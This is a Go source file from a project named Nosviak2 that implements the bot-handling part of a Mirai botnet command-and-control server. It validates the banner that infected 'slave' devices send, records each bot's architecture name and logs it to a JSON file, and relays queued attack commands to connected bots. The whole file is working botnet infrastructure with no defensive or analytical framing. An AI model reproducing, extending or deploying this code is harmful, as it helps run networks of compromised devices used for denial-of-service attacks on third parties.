package mirai

import (
	"Nosviak2/core/configs"
	"Nosviak2/core/sources/layouts/logs"
	"Nosviak2/core/sources/layouts/toml"
	"bytes"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"path/filepath"
)

//properly serves the incoming connection
//this will ensure its done without any errors
func ServeConnection(c net.Conn) { //checks the information

	//reads the input properly without issues
	//this will make sure its done without any errors
	buf := make([]byte, 4) //what we read into safely
	length, err := c.Read(buf) //reads into the buffer properly
	if err != nil || length <= 0 { //error handles without issues
		return //ends the routine properly without issues on purpose
	}

	//checks the banners properly and safely
	//this will ensure they are properly secured if they want to be
	if toml.ConfigurationToml.Mirai.EnforceBanner && !bytes.Equal(buf[:length], BuildBanner(make([]byte, 0))) { //checks
		if deployment.DebugMode { //debug mode detection properly
			//this will render the slave banner without issues happening
			log.Println("[Slave Banner] ["+c.RemoteAddr().String()+"] ["+string(buf)+"]")
		}
		log.Printf("[Slave declined] [invalid banner provided from the client] [%s]\r\n", c.RemoteAddr().String()) //renders why
		return //ends the function properly
	}

	arcLen := make([]byte, 1)
	//reads from the bot properly without issues
	//this will ensure its done without errors happening
	logic, err := c.Read(arcLen)
	if err != nil { //err handles
		log.Printf("[slave declined] [invalid slave name has been passed] [%s]\r\n", c.RemoteAddr().String())
		return //ends the function properly
	}

	//stores the client properly
	var client *Client = &Client{
		Conn: c, //sets the connection
		Queue: make(chan []byte),
	}

	//reads the name input properly
	//this will ensure its done without any errors
	if logic == 1 && arcLen[0] > 0 { //checks properly
		Name := make([]byte, arcLen[0]) //buffer for name
		if _, err := c.Read(Name); err != nil { //error handles properly
			log.Printf("[slave declined] [invalid slave name has been passed] [%s]\r\n", c.RemoteAddr().String())
			return //ends the function properly
		}

		//sets the slaves name
		//this will be used to identify the slave
		client.Name = string(Name)
	}


	var logging *jsonSlave = &jsonSlave{
		Address: c.RemoteAddr().String(), 
		DeviceName: client.Name, 
		DeviceCount: MiraiSlaves.Count+1,
		Joined: true,
	}




	//writes into the log file properly and safely
	//this will ensure its done without any errors happening on purpose
	//ignores any errors which are created within this system properly allows for better control
	logs.WriteLog(filepath.Join(deployment.Assets, "logs", "slaves.json"), logging)

	client.Add()
	//flips the type properly
	//this will ensure its done without any errors
	logging.Joined = false
	defer client.Remove()

	//goroutine for handling without issues
	//this will ensure its done without any errors happening
	go func() { //this will await the system count properly and safely
		for { //awaits for commands properly and safely
			//this will ensure its done without any errors
			point, open := <- client.Queue
			if !open {return} //ends loop routine

			//checks for debug mode properly
			//this will ensure its done without any errors
			if deployment.DebugMode { //debugmode checking properly without issues
				//renders information about the command being sent without errors happening
				fmt.Printf("[Debug] [%s] [%s]", client.Conn.RemoteAddr().String(), hex.EncodeToString(point))
			}

			//tries to write the data point properly
			//this will ensure its done without any errors
			if _, err := client.Conn.Write(point); err != nil {
				return //ends the function properly
			}
		}
	}()


	//checks for read sleep properly
	//this will ensure its done without any errors
	if !toml.ConfigurationToml.Mirai.ReadSleep {
		//readers buffer input properly
		//this will ensure its done without any errors
		buffer := make([]byte, 38) //reads the input proeprly
		if _, err := client.Conn.Read(buffer); err != nil {
			return //ends the function properly and safely
		}

		//displays the buffer information
		//this will ensure its done without errors
		if deployment.DebugMode { //displays the debug information
			log.Printf("[SlaveBuffer] [%s] [%s]", c.RemoteAddr().String(), hex.EncodeToString(buffer))
		}; return //kills the function properly
	}

	//loops forever properly
	//this will ensure its done without any errors
	for { //loops until the slave leaves properly
		//readers buffer input properly
		//this will ensure its done without any errors
		buffer := make([]byte, 38) //reads the input proeprly
		if _, err := client.Conn.Read(buffer); err != nil {
			break //ends the function properly and safely
		}; continue
	}
}

//stores information about our slave without issues
//this will ensure its done without any errors happening
type jsonSlave struct { //stored inside our structure properly
	Address string `json:"address"`
	DeviceName string `json:"architecture"`
	DeviceCount int `json:"count"`
	Joined bool `json:"joined"`
}